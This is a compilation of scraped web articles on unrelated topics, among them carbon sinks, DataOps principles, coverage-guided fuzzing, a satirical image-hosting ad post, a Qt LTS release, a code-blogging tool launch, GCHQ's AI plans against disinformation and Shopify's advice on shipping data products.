rel="noopener" href="https://globalecoguy.org/carbon-offsets-should-make-you-nervous-9995a00db0d6">using nature-based carbon removal</a> approaches — that <em>absorb</em> some of our emissions, or even begin to remove some of our past pollution.</p><p id="721d">To do this, we must start by<strong> protecting Earth’s <em>existing</em> carbon sinks</strong>, found in forests and the ocean. While we want to build <em>additional</em> carbon sinks, we first need to ensure that existing sinks — which remove ~55% of our carbon dioxide emissions and ~40% of our total greenhouse gas emissions — are maintained. If these start to decline, we will be under even more pressure to cut emissions and create other carbon sinks.</p><p id="6c5c">Beyond protecting nature’s <em>existing</em> carbon sinks, we can start to <strong>add new ones by restoring ecosystems</strong>, especially by planting trees. There are discussions about planting billions and billions of trees to absorb some of our remaining emissions. However, the merits and practicality of these schemes are still hotly debated. In addition to tree planting, <strong>we could use regenerative farming practices </strong>on croplands, pastures, and degraded lands — building back carbon in the soils and vegetation, creating new carbon sinks. There are debates about the effectiveness of these solutions, but there is enormous potential for carbon uptake on our working lands.</p><p id="2f8b">This wave of climate solutions is, by its very nature, steady and gradual, playing out over decades. Protecting nature’s current carbon sinks and adding new ones is a long-game, based on building carbon stocks in trees and soil. We should start this work today and continue to protect our natural ecosystems and regeneratively manage our working lands through the next few decades and beyond.</p></div></div></section><section><div><div><p id="62eb">The other waves can address <em>most</em> of our emissions and create <em>significant</em> new carbon sinks. But there are areas that are <strong>difficult to decarbonize</strong> and will require new technology. And there are opportunities to use technology to <strong>remove carbon from the atmosphere</strong> beyond what nature-based solutions can do. This is where focused research and development efforts, starting today, could pay off in the long run.</p><p id="3e7a">This wave of climate solutions depends on new technology, but as an “end game” move in the <a rel="noopener" href="https://globalecoguy.org/we-need-to-see-the-whole-board-to-stop-climate-change-98be66412281">climate chess match</a>. These will take time to develop, so we should rely on other, existing solutions in the next two decades, leaving these new technologies for the final moves.</p><p id="df23">Specifically, I think we need to focus on research and development, starting today, to <strong>make carbon-free cement, steel, plastic, and jet fuel</strong>. There are pilot projects to do this today, but they are far from economically competitive and scalable. But with some significant investment, I am confident we can find good, cheap, reliable ways to do this in the coming decades.</p><p id="8601">In addition, there are interesting ideas about <strong>removing carbon from the atmosphere using a variety of industrial and chemical processes</strong>. At present, these are only small pilot projects, not nearly enough to make a dent in the atmosphere. But with a decade or two of additional research and development, these technologies may mature to be able to remove our last, hard-to-decarbonize emissions in the 2040s.</p><p id="64d5">A (potentially big) mistake would be to let the promise of carbon removal technology be an excuse to delay immediate emissions cuts. These technologies are likely decades away and only absorb some of our final emissions.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div id="post-content" itemprop="articleBody"> <p>These are 10 of the principles of <a href="https://blog.tinybird.co/2021/02/27/dataops/">DataOps</a> that we make available to data teams.</p> <p>While we always challenge our assumptions, this new paradigm guides the way we are building Tinybird, deeply focused on simplicity, speed and developer experience.</p> <h3 id="1-the-data-project"> 1. The Data Project <a href="#1-the-data-project">¶</a> </h3> <p>This is like your framework (<em>think of MVC for web development</em>). It describes how your data should be stored, processed, and exposed through APIs.</p> <p>You put there your <a href="https://docs.tinybird.co/cli.html#data-projects-title">know-how</a>, abstractions and the focus on the problem you are solving.</p> <h3 id="2-serialization"> 2. Serialization <a href="#2-serialization">¶</a> </h3> <p>All your table schemas, transformations and endpoints need to be serializable. Keep <a href="https://docs.tinybird.co/cli.html#datafile-reference-title">the format</a> simple for humans to read and write. If possible, map every resource to a text file.</p> <h3 id="3-version-control"> 3. Version Control <a href="#3-version-control">¶</a> </h3> <p>This is a consequence of having a data project and a file format. Treat your data project as regular source code, and <a href="https://blog.tinybird.co/2021/01/22/tech-product-design-how-we-integrate-with-git/">push it to a source version control system</a> (e.g. git)</p> <p>From there you get traceability over changes, collaboration, peer reviews, automations and the very same workflow and best practices you are used to as a development team.</p> <h3 id="4-continuous-integration-and-deployment"> 4. Continuous Integration and Deployment <a href="#4-continuous-integration-and-deployment">¶</a> </h3> <p>The key for most of the things developers do is speed. Innovation is iteration and if you are fast you can learn faster and iterate faster.</p> <p>This means making an assumption, running an experiment, learn and repeat, ensuring quality.</p> <p>Your system should allow you to easily create testing environments and use fixtures, so you can build, test and measure your data pipelines and endpoints on every change.</p> <h3 id="5-lead-time"> 5. Lead Time <a href="#5-lead-time">¶</a> </h3> <ul> <li>Deploying to production should be seconds (<em>not minutes or hours</em>)</li> <li>Fixing a bug should be minutes (<em>not hours or days</em>)</li> <li>Developing a new feature should be hours (<em>not days or weeks</em>)</li> </ul> <h3 id="6-data-quality-assurance"> 6. Data Quality Assurance <a href="#6-data-quality-assurance">¶</a> </h3> <p>So you are a data engineer working for a Fortune 500 company, are you confident enough (<em>or even allowed</em>) to make a change in any of your data pipelines and push it to production right away in a matter of minutes?</p> <p>How do you ensure data quality in your data product?</p> <p><strong><a href="https://guides.tinybird.co/guide/implementing-test-strategies">Data needs tests</a>, even more than code.</strong></p> <h3 id="7-tools"> 7. Tools <a href="#7-tools">¶</a> </h3> <p>Pick tools based on your goals, but as a starting point, your tools should make it easy for your team to access, share, and analyze data.</p> <p>You should be able to <a href="https://docs.tinybird.co/cli.html">work from your terminal</a> or IDE without leaving your data project context.</p> <p>Avoid steep learning curves, use a familiar syntax, short and clear so you can run and automate stuff quickly.</p> <p>When it comes to data exploration and problem-solution discovery, you need instant feedback.</p> <h3 id="8-observability"> 8. Observability <a href="#8-observability">¶</a> </h3> <p>You need to run and understand <a href="https://docs.tinybird.co/api-reference/service-datasources.html">your data in production</a> and quickly learn if it’s solving your business problems.</p> <p>Automate <a href="https://guides.tinybird.co/guide/on-the-fly-health-checks">health checks</a>, monitor performance, allow runtime traceability and implement an alerting system.</p> <h3 id="9-recipes-and-building-blocks"> 9. Recipes and building blocks <a href="#9-recipes-and-building-blocks">¶</a> </h3> <p>The data development experience should be as close as the experience you actually have working with some library that you will import and use in any language.</p> <p>Your analysis should be idempotent, composable and immutable. Wrap them and make them reusable right away.</p> <p>Wrap your analyses into <a href="https://github.com/tinybirdco/log_parsing_template">reusable data projects</a>.</p> <h3 id="10-fine-tuning"> 10. Fine Tuning <a href="#10-fine-tuning">¶</a> </h3> <p>Query optimization is a never ending process. You should monitor queries and transformations to build a system that helps <a href="https://blog.tinybird.co/2020/12/15/eating-our-own-dog-food-how-we-investigate-performance-bottlenecks-using-our-product-and-google-sheets/">fine tuning your data products</a>.</p> <h3 id="bonus-track-publication-and-documentation"> Bonus track: publication and documentation <a href="#bonus-track-publication-and-documentation">¶</a> </h3> <p><strong>Data and development teams work together</strong>. Your data are exposed as <a href="https://blog.tinybird.co/2020/08/11/badass-api-endpoint/">auto-documented APIs</a>, so it can be integrated anywhere.</p> <p>Don’t forget about not so cool tools such as <a href="https://blog.tinybird.co/2020/12/15/eating-our-own-dog-food-how-we-investigate-performance-bottlenecks-using-our-product-and-google-sheets/#visualizing-the-correlation-matrix-in-google-sheets">spreadsheets</a> and traditional BI.</p> <p><strong><em>What are your main challenges when dealing with large quantities of data?</em></strong> <a href="https://www.tinybird.co/survey">Tell us about them</a> and get started solving them with Tinybird right away.</p> </div>  </article>  </div> </div></div>]]>

<p>In recent years, feedback-based fuzzing (or coverage-guided fuzzing) has experienced an unmatched success story. For example, over 27,000 bugs have been found in Chrome and several open-source projects and Google stated that it finds around 80% of its bugs with modern fuzzing techniques. However, fuzzing is not only reserved for big tech companies: It is gradually finding its way into the wide world.</p>
<p><span>Fuzzing is used for security and stability testing of the codebase. The application under test is fed with a series of inputs, which are smartly mutated in the testing process. The testing tool gets feedback about the code covered during the execution of inputs. Unlike traditional or black-box fuzzing, feedback-based fuzzing explores the program state efficiently and discovers bugs hidden deep in the code. If you want to learn more in detail about the underlying technology, we recommend you to read our blog post <a href="https://blog.code-intelligence.com/the-magic-behind-feedback-based-fuzzing?hsLang=en"><span>The Magic Behind Feedback-based Fuzzing.</span></a>&nbsp;</span></p></span></p>

After filtering candidates based on relevant traits such as age, marital status and naivety, we finally settled on our new CAISO!</p>
<p>He came in with some fresh new ideas, most of which were rejected outright, and we quickly got him working on the next big thing.
IMGZ has been <a href="https://imgz.org/blog/2020/12/23/haha-suckers/">growing exponentially</a>, and, despite all the problems that come with growth, our focus is LASER-focused on one thing:
Money.
We want to make lots and lots of money, as much as possible, as fast as possible.
Our motto is "At IMGZ, images come first, after money".</p>
<p>Given this imperative, we got our finger on the pulse of the webiverse, and realized that, if we were going to make money, we couldn't rely on people paying us money for services.
That's just not the way the web operates.
We needed to take a page from the book of Facebook, Google, Amazon and AltaVista and innovate, so we sat down with our new CAISO and thought long and hard about how AI could aid us in our monetization strategy, and finally came up with a radical new monetization model:</p>
<p>Ads.</p>
<h2>Ads</h2>
<p>Ads on the internet are not new.
They've been around for at least two years, and people are getting tired of them already.
They aren't so much getting tired of <em>seeing</em> ads, which are always relevant and nigh-magical in their pinpointing of the exact thing you're wanting to buy at any given time, but they're getting tired of the sacrifices needed to achieve this accuracy.</p>
<p>They're getting tired of the constant invasion of privacy by internet giants, who impinge on people's rights to sell them exactly the right thing at exactly the right time.</p>
<p>At IMGZ, we believe that AI can help.
Help the users preserve their privacy, help the advertisers present their products in a respectful manner, but, most importantly, help us make lots of money.</p>
<p>We present to you:</p>
<p>Privacy-preserving ads.</p>
<h2>Privacy-preserving ads</h2>
<p>Privacy-preserving ads is a brand-new technology, from the innovative free-thinkers of IMGZ.
We dared to ask the question "how can we monetize the free trial?".
The obvious answer was "ads".</p>
<p>However, tracking the user and placing some relevant ads next to the images as they viewed them was too invasive, and protecting our users' privacy is the third most important priority for us.</p>
<p>We thought long and hard, and, leveraging our latest hire, we quickly came up with a design for an ML-powered pipeline:</p>
<ul>
<li>The uploading frontend ingests images and sends them to a Kafka queue.</li>
<li>If the image belongs to a user on the free trial, Kafka forwards the images to a distributed worker pool for deep learning processing with a custom Keras model.</li>
<li>The Keras model performs saliency detection to find the most important parts of the image.</li>
<li>Once the most important parts of the image are identified, we send the image back to Kafka for forwarding to the next step in the pipeline, categorization.</li>
<li>A second Keras model performs label extraction on the image, to find a few categories that the image belongs to (such as "woman, dress, smiling").</li>
<li>The next step processes the image, selecting the best ad for the category and stitching it into the salient parts of the image.</li>
<li>The image is stored and forwarded to the CDN for serving.</li>
</ul>
<p>After lots of back and forth, we finalized this plan and realized we couldn't be bothered to do any of this and just wrote three lines of OpenCV to detect faces and slap our logo on them:</p>
<p><a href="https://imgz.org/i7GXsVuM/"><img src="https://imgz.org/i7GXsVuM-1280.jpg" alt=""></a></p>
<p>You will notice that you can't tell who this guy is, perfectly preserving his privacy.
In fact, we're sure you didn't even notice this is actually <em>a girl</em>.</p>
<p><strong>That</strong> is the power of AI.</p>
<h2>The power of AI</h2>
<p>With the help of our engineers, we managed to take this solution from an average of 68 seconds per image to near <em>real-time</em>.
As the free-trial user uploads an image, detection and advertization runs in a few milliseconds, ruining the image nearly instantly and resulting in happy advertisers and users who retained their privacy.</p>
<p>For example, try to recognize even one person in this photo, where the photographer did not obtain model releases:</p>
<p><a href="https://imgz.org/i3yjnGcF/"><img src="https://imgz.org/i3yjnGcF-1280.jpg" alt=""></a></p>
<p>You'll find that you can't!
You may, however, get an inexplicable urge to sign up for IMGZ, which is exactly the intended effect of the subtle advertising.</p>
<p>Of course, while trial users enjoy the full suite of privacy-preserving tools IMGZ has to offer, paid users will be subject to no such annoyance.
Their images will be uploaded and served entirely unchanged, as a thank-you from us to their money.</p>
<h2>Epilogue</h2>
<p>Of course, none of this would be possible without the help of one man:</p>
<p><a href="https://imgz.org/ipFmfjaJ/"><img src="https://imgz.org/ipFmfjaJ-1280.jpg" alt=""></a></p>
<p>He's still on the trial account, as he hasn't paid for an IMGZ account yet, but he'll have to when his trial expires.</p>
<p>We hope that this short article has given you some insight in the pioneering research that goes on at IMGZ in the fields of both privacy and monetization, and maybe you'll implement some of these ideas in your own companies, for only a modest fee to us.</p>
<p>Enjoy, and don't forget, <a href="https://imgz.org/#login">the signup link is here</a>.</p>

March 4, 2021 | https://www.qt.io/blog/commercial-lts-qt-5.15.3-released | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/commercial-lts-qt-5.15.3-released">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>We <a href="https://www.qt.io/blog/qt-offering-changes-2020" rel="noopener" target="_blank">announced</a> a bit over one year ago that the long-term supported releases of Qt 5.15 will be available only for commercial license holders. Today we have released Qt 5.15.3 LTS, the first commercial only patch release to Qt 5.15 LTS series. As a patch release, Qt 5.15.3 does not add any new functionality but provides bug fixes and other improvements.</p>
<!--more-->
<p>Compared to Qt 5.15.2, the new Qt 5.15.3 contains close to 250 bug fixes. All the applicable bug fixes are also part of the upcoming <a href="https://wiki.qt.io/Qt_6.1_Release" rel="noopener" target="_blank">Qt 6.1</a> release targeted to be released in April.</p>
<p>We have adjusted the process of change files and instead of separate changelog for each module you can check the overview of all important changes and bug fixes in the Qt 5.15.3 from <a href="https://account.qt.io/" rel="noopener" target="_blank">the release note found in the Qt Account portal</a>.</p>
<p>Qt 5.15.3 is automatically visible for all commercial license holders in the online installer (maintenance tool). The source packages of Qt 5.15.3 are available via the online installer as well as the Qt Account. The offline packages for Qt 5.15.3 are available from the Qt Account portal.</p>
<p>If you want to access the source code repository, it can be done via the <a href="https://codereview.qt-project.org/" rel="noopener" target="_blank">Codereview</a>&nbsp;system. Just log in with a Qt Account that has a valid commercial license, and you will be able to access the LTS repositories. For more details, please check <a href="https://wiki.qt.io/Qt_5.15_Release#Getting_Source_Codes" rel="noopener" target="_blank">the instructions for accessing the commercial LTS repositories</a>.</p>
<p>Qt for Device Creation images are also available for Qt 5.15.3 LTS. If you want to build yourself with yocto, use the meta-qt5 layer from the Qt repository. We have updated the yocto meta-qt5 layer of Qt 5.15.3 to point to the commercial LTS repositories. For more details, please check <a href="https://doc.qt.io/QtForDeviceCreation-5.15/qtee-meta-qt5.html" rel="noopener" target="_blank">the instructions on using yocto with access to the commercial LTS repositories</a>.</p>
<p>If you have any problems with the commercial LTS releases, please contact Qt Support. You can also create bugs to <a href="https://bugreports.qt.io/" rel="noopener" target="_blank">https://bugreports.qt.io</a>, but in addition it is recommended to notify the support team about it.</p>
<p>Next commercial-only LTS patch release, Qt 5.15.4 is planned to be released at the end of April.</p></span></p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1612806590421/HzFmerMxA.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>So, I’ve been <strong>code-blogging</strong> (a fancy term I’ve come up with) for <a target="_blank" href="https://areknawo.com/">over 2 years now</a>. And to be honest, it’s been a fantastic experience! Not only did it gave me a chance to share my knowledge, but also to establish my position in the industry.</p>
<p>But I know I’m not the only one! Code-blogging has been rising steadily in popularity, as more and more knowledgeable people enter the field, with intention of sharing and build their portfolios.</p>
<p>With that said, there is one pretty significant downside to code-blogging, and that is <strong>the lack of tooling</strong>. Blogging in this niche requires the creator to deal with things that aren’t required anywhere else, like <strong>code snippets</strong>. Different platforms and tools handle such things differently, with varying <strong>user-friendliness</strong>.</p>
<p>Personally, none of them delivered the experience that I’d deemed good, requiring me to copy-paste my code snippets for formatting and handling compatibility issues across publishing platforms.</p>
<p>And that’s why I created <strong>CodeWrite</strong>!</p>

<p>CodeWrite is a writing tool designed specifically for code-blogging, that comes in a form of a <strong>browser extension</strong>. I’d go as far as to say that it’s one-of-a-kind and thus <em>the best code-blogging tool</em>.</p>
<p>It brings code-blogging to the next level, thanks to a <strong>beautifully-crafted editing experience</strong> with a full-fledged, batteries-included <strong>code editor</strong> for handling your code snippets!</p>
<p>But that’s not all! CodeWrite was created with intention of making every aspect of code-blogging better - including publishing!</p>
<p>In this aspect, CodeWrite introduces something that hasn’t been done before - <strong>one-click publishing</strong>. This means that you can write your post, pin it, and go to one of supported services (for start these are <a href="http://dev.to/" target="_blank">Dev.to</a>, Hashnode, and Medium), open the CodeWrite pop-up, and click the publishing button! CodeWrite will automatically detect all known incompatibilities - like too large images or lack of code highlighting - and allow you to choose the solution - in our example, resize the image, and use GitHub Gists (access token required)!</p>
<p>But I won’t bother you with marketing, as there’s a lot more to talk about - like great compatibility with Grammarly, included search, offline support, and standalone mode. No. Instead, you should go and see it for yourself!</p>
<p>So, if you’re a code-blogger and want to make your work that much more pleasing - go to <a target="_blank" href="https://codewrite.io/">codewrite.io</a>, hit download, and give it a try in a demo mode!</p>
<p>CodeWrite starts at <strong>$3/month</strong> (a penny compared to time and friction saved), but there’s a treat for you - dear reader of this announcement post!</p>
<blockquote>
<p>Use the code <strong>first100</strong> to get <strong>20% off</strong> - lifetime! But that’s only for the first 100 of you!</p>
</blockquote>
<p>So, thanks for checking out CodeWrite, and leave your thoughts below! Also, be sure to upvote CodeWrite on <a target="_blank" href="https://www.producthunt.com/posts/codewrite">ProductHunt</a>, follow the development on <a target="_blank" href="https://twitter.com/codewriteio">Twitter</a>, and check out the <a target="_blank" href="https://discord.gg/W68KyVPBdP">CodeWrite Discord</a> for on-going CodeWrite discussions! See you there - on the brighter side of code-blogging!</p>
<p>And yes - this piece was written using CodeWrite!</p>

March 4, 2021 | https://techmonitor.ai/ai/gchqs-plans-ai-tackle-disinformation-thorny-questions | <a href="https://web.archive.org/web/*/https://techmonitor.ai/ai/gchqs-plans-ai-tackle-disinformation-thorny-questions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><span>Last week, UK intelligence agency GCHQ revealed its ambition to use artificial intelligence (AI) to combat a number of social ills, including disinformation. Possible applications include detecting deep fakes, blocking botnets and automated fact-checking, a report from the agency said. But these proposals raise both practical questions and deeper quandaries, including who gets to define disinformation.&nbsp;</span>
</p><figure id="attachment_6493" aria-describedby="caption-attachment-6493"><img src="https://techmonitor.ai/wp-content/uploads/sites/20/2021/03/GCHQ-aerial-658x370.jpg" alt="GCHQ AI disinformation" width="658" height="370"><figcaption id="caption-attachment-6493">An aerial image of the Government Communications Headquarters (GCHQ) in Cheltenham, Gloucestershire. (Photo courtesy of the Ministry of Defence)</figcaption></figure>
<p><span>The UK’s security apparatus has become increasingly interested in disinformation and online speech in recent years, following intense focus on allegations that Russia attempted to interfere with the 2016 US presidential election <a href="https://www.thenation.com/article/archive/russiagate-elections-interference/">using social media</a>. </span>
</p><p><span>T</span><span>he Russia report, released by the Intelligence and Security Committee in July 2020, <a href="https://tech.newstatesman.com/policy/russia-report-mi5-social-media">proposed a role</a> for the UK’s security agencies – specifically MI5 – in policing social media content, something it termed ‘defending the UK’s discourse’. It highlighted that MI5 already works with social media companies to identify and remove terrorist content, so was the natural agency to take on an appended role covering disinformation.&nbsp;</span></p>
			
<p><span>The report suggested: “GCHQ might attempt to look behind the suspicious social media accounts that open-source analysis has identified to uncover their true operators (and even disrupt their use).”</span></p></div><div>
<p>Since then, military bodies have become more involved in the ‘fight’ against online misinformation. Nato has taken on <a href="https://www.nato.int/cps/en/natohq/177273.htm">a role</a> countering Covid-19-related disinformation, and GCHQ is currently undertaking an offensive cyber-operation against anti-vaccine content purportedly spread online by ‘hostile states’. “GCHQ has been told to take out anti-vaxxers online and on social media,” a well-placed source <a href="https://www.thetimes.co.uk/article/gchq-in-cyberwar-on-anti-vaccine-propaganda-mcjgjhmb2">told the <em>Times</em>.</a>
</p>
<h2>Using AI to tackle disinformation</h2>
<p><span>In the new paper, GCHQ’s hypothetical AI-enabled tools to tackle disinformation include machine-assisted fact-checking through validation against trusted sources, detecting deep fake media content, detecting and blocking botnets with machine-generated social media accounts, and online operations to counteract malicious accounts.</span>
</p><p><span>The proposals raise some practical questions. The major social media platforms – the main sites of disinformation spread – have already rolled out their own AI-enabled tools to detect disinformation. For example, to help identify viral misinformation, Facebook <a href="https://ai.facebook.com/blog/heres-how-were-using-ai-to-help-detect-misinformation/">uses SimSearchNet++</a>, an image matching model trained using self-directed learning, an AI system that can recognise images and text with only minor tweaks using a tool called ObjectDNA, as well as tools to detect deep fakes.&nbsp;</span>
</p><p><span>It is unclear what GCHQ would add by deploying its own tools – and indeed whether the social media platforms would permit it to do so. Facebook, for example, does not allow GCHQ or other security agencies to run such tools on its platform, although it does work closely with law enforcement in other areas. And </span><span>taking action on social media accounts independently of the platforms could expose GCHQ to legal challenges.&nbsp;</span>
</p>
<p>But a bigger issue for GCHQ’s planned use of AI against disinformation could be the subjectivity of the concept, which has no legal basis in the UK.
</p><p><a href="https://techmonitor.ai/newsletter">[<em>Keep up with Tech Monitor: Subscribe to our weekly newsletter</em>]</a>
</p><h2>Who defines disinformation?</h2>
<p><span>The terms ‘misinformation’ or ‘disinformation’ can be easily abused by states to police civilian speech and restrict freedom of expression. </span><span>A Broadband Commission <a href="https://www.broadbandcommission.org/Documents/working-groups/FoE_Disinfo_Report.pdf">report</a> identifies that governments including Bahrain, Cambodia, Kazakhstan and Thailand have taken this approach. </span>
</p><p><span>“The paradox to highlight here is that governments that appear to be seeking to control speech for political gain try to legitimise their actions by referring to hate speech regulations and anti-disinformation laws,” the report reads. “In other words, disinformation responses risk being used (or justified for use) for censoring legitimate expression – and clearing the field for official disinformation to spread unchecked.”</span>
</p><p><span>Trisha Meyer, an assistant professor in digital governance and participation at Vesalius College of the Vrije Universiteit Brussel, stresses the need to distinguish between different types of ‘harmful’ material, especially between those that are legal and illegal. </span><span>Rights groups have repeatedly <a href="https://www.indexoncensorship.org/2019/04/online-harms-proposals-pose-serious-risks-to-freedom-of-expression-online/">urged legislators</a> to steer away from woolly definitions of ‘harm’ when devising laws for social media platforms – for example, concerning the UK’s upcoming Online Harms bill.&nbsp;</span>
</p>
<p>Citizens should be wary of security agencies, <span><a href="https://www.democraticaudit.com/2018/10/03/audit2018-how-accountable-are-the-uks-security-and-intelligence-services-to-parliament/">whose activities are often closed to public or parliamentary scrutiny</a>, policing public speech, Meyer adds</span><span>. </span><span>“I think there is a need for scrutiny… and accountability is important.” She points to parallels with GCHQ’s <a href="https://www.bbc.com/news/uk-45510662">bulk surveillance programmes</a> that were revealed in the Snowden leaks. “What happens if you get flagged as having posted harmful content and then you get put on a list?” says Meyer. “There’s a lot of that I do think we need to be concerned about.”</span>
</p><p><span>This lack of accountability is exacerbated by the use of AI technologies, which are often inscrutable even to the organisations using them. Platforms including Facebook, YouTube and Twitter have all warned that their increased use of AI for content moderation is <a href="https://www.npr.org/2020/03/31/820174744/facebook-youtube-warn-of-more-mistakes-as-machines-replace-moderators?t=1614784618272">likely to lead to mistakes</a>. “We need to make sure that AI and automated technology isn’t an additional excuse of saying… that we’re unable to be held accountable,” says Meyer.&nbsp;&nbsp;</span>
</p><p><span>An even deeper issue is the fact that these approaches focus on how the problem of disinformation manifests, rather than its root cause. Meyer says that much of the discussion around disinformation focuses on making platforms responsible, rather than the “far deeper-seated societal issues” that might lead people to be susceptible to disinformation or distrustful of the state-endorsed narrative. </span>

  <p>Shipping a new product is hard. Doing so under tight time constraints is even harder. It’s no different for data-centric products. Whether it’s a forecast, a classification tool, or a dashboard, you may find yourself in a situation where you need to ship a new data product in a seemingly impossible timeline.&nbsp;</p>
<p>Shopify’s Data Science team has certainly found itself in this situation more than a few times over the years. Our team focuses on creating data products that support our merchants’ entrepreneurial journeys, from their initial interaction with Shopify, to their first sale, and throughout their growth journey on the platform. Commerce is a fast changing industry, which means we have to build and ship fast to ensure we’re providing our merchants with the best tools to help them succeed.</p>
<p>Along the way, our team learned a few key lessons for shipping data products quickly, while maintaining focus and getting things done efficiently—<em>but also done right.</em> Below are four tips that are proven to help you ship new products fast.&nbsp;</p>

<p>Investing time in a design sprint pays off down the line as you approach deadlines. The design sprint (created by <a href="https://www.gv.com/sprint/" target="_blank" title="Google Ventures" rel="nofollow noopener noreferrer">Google Ventures</a>) is “a process for answering critical business questions through design, prototyping and testing ideas with customers.” Sprints are great for getting a new data product off the ground quickly because they carve out specific time blocks and resources for you and your team to work on a problem. The Shopify Data Science teams make sprints a common practice, especially when we’re under a tight deadline. When setting up new sprints, here are the steps we like to take:</p>
<ol>
<li>
<strong><em>Choose an impactful problem to tackle. </em></strong>We focus on solving problems for our merchants, but in order to do that, we first have to uncover what those problems are by asking questions. <em>What</em> is the problem we’re trying to solve? <em>Why </em>are we solving this problem? Asking questions empowers you to find a problem worth tackling, identify the right technical solution and ultimately drive impact.</li>
<li>
<strong><em>Assemble a small sprint team</em></strong>: Critical to the success of any sprint is assembling a small team (no more than 6 or 7) of highly motivated individuals. Why a small team? It’s easier to stay aligned in a smaller group due to better communication and transparency, which means it’s easier to move fast.</li>
<li>
<strong><em>Choose a sprint Champion:</em></strong> This individual should be responsible for driving the direction of the project and making decisions when needed (should we use solution A or B?). Assigning a Champion helps remove ambiguity and allow the rest of the team to focus their energy on solving the problem in front of them.</li>
<li>
<strong><em>Set your sprint dates:</em></strong> Timeboxing is one of the main reasons why sprints are so effective. By setting fixed dates, you're committing your team to focus on shipping on a precise timeline. Typically, a sprint lasts up to five days. However, the timeline can be shortened based on the size of the project (for example, three days is likely enough time for creating the first version of a dashboard that follows the impact of COVID-19 on the business’s acquisition funnel).</li>
</ol>
<p>With your problem identified, your team set up, and your dates blocked off, it’s now time to sprint. Keep in mind while exploring solutions that solving a data-centric problem with a non-data focused approach can sometimes be simple and time efficient. For instance, asking a user for its preferred location rather than inferring it using a complex heuristic.</p>

<p>Speed is critical! The first iterations of a brand new product often go through many changes. Prototypes allow for quick and cheap learning cycles. They also help prevent the sunk cost fallacy (when a past investment becomes a rationale for continuing).&nbsp;</p>
<p>In the data world, a good rule of thumb is to leverage spreadsheets for building a prototype. Spreadsheets are a versatile tool that help accelerate build times, yet are often underutilized by data scientists and engineers. By design, spreadsheets allow the user to make sense of data in messy contexts, with just a few clicks. The built-in functions cover most basic use cases:&nbsp;</p>
<ul>
<li>cleaning data by hand rapidly</li>
<li>displaying graphs</li>
<li>computing basic ranking indices</li>
<li>formatting output data.</li>
</ul>
<p>While creating a robust system is desirable, it often comes at the expense of longer building times. When releasing a brand new data product under a tight timeline, the focus should be on developing prototypes fast.&nbsp;</p>
<figure><img alt="A sample Google Sheet dashboard evaluating Inbound Leads.  The dashboard consists of 6 charts.  The 3 line charts on the left measure Lead Count, Qualification Rate %, and Time to Qualification in Minutes.  The 3 bar charts on the right  measure Leads by Channel, Leads by Country, and Leads by Last Source Touched." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455" src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455">
<figcaption>An example of a dashboard prototype created within Google Sheets.</figcaption>
</figure>
<p>Despite a strong emphasis on speed, a prototype should still look and feel professional. For example, the first iteration of the <a href="https://www.shopify.my/blog/marketing-attribution" target="_blank" title="Marketing Attribution: Seeing the Customer Journey More Clearly" rel="noopener noreferrer">Marketing attribution tool</a> developed for Shopify’s Revenue team was a collection of SQL queries automated by a bash script. The output was then formatted in a spreadsheet. This allowed us to quickly make changes to the prototype and compare it to out-of-the-box tools. We avoided any wasted effort spinning up dashboards, production code, as well as any sentimental attachment to the work, which made it easier for the best solution to win.</p>

<p>When building a new data product, it’s tempting to spend lots of time on a flashy machine learning algorithm. This is especially true if the product is supposed to be “smart”. Building a machine learning model for your first iteration can cost a lot of time. For example, when sprinting to build a lead scoring system for our Sales Representatives, our team spent 80% of the sprint gathering features and training a model. This left little time to integrate the product with the existing <a href="https://en.wikipedia.org/wiki/Customer_relationship_management" target="_blank" title="Customer Relationship Management on Wikipedia" rel="nofollow noopener noreferrer">customer relationship management</a> (CRM) infrastructure, polish it, and ask for feedback. A simple ranking using a proxy metric would be much faster to implement for the first iteration. The time gained would allow for more conversations with the users about the impact, use and engagement with the tool.&nbsp;</p>
<p>We took that lesson to heart in our next project when we built a sales forecasting tool. We started with a linear regression using only two input variables that allowed us to have a prototype ready in a couple of hours. Using a simple model allowed us to ship fast and quickly learn whether it solved our user’s problem. Knowing we were on the right track, we then built a more complex model using machine learning.</p>
<p>Focus on building models that solve problems and can be shipped quickly. Once you’ve proven that your product is effective and delivers impact, then you can focus your time and resources on building more complex models.&nbsp;</p>

<p>Shipping fast also means shipping the right product. In order to stay on track, gathering feedback from users is invaluable! It allows you to build the right solution for the problem you’re tackling. Take the time to talk to your users, before, during, and after each build iteration. Shadowing them, or even doing the task yourself is a great return on investment.</p>
<p>Gathering feedback is an art. Entire books and research papers are dedicated to it. Here are the two tips we use at Shopify that increased the value of feedback we’ve received:</p>
<ul>
<li>
<em>Ask specific questions.</em> Asking, “Do you have any feedback?” doesn’t help the user direct their thoughts. Questions like, “How do you feel about the speed at which the dashboard loads?” or “Are you able to locate the insights you need on this dashboard to report on top of funnel performance?” are more targeted and will yield richer feedback.</li>
</ul>
<ul>
<li>
<em>Select a diverse group of users for feedback</em>. Let’s suppose that you are building a dashboard that’s going to be used by three regional teams. It’s more effective to send a request for feedback to one person in each team rather than five people in a single team.</li>
</ul>
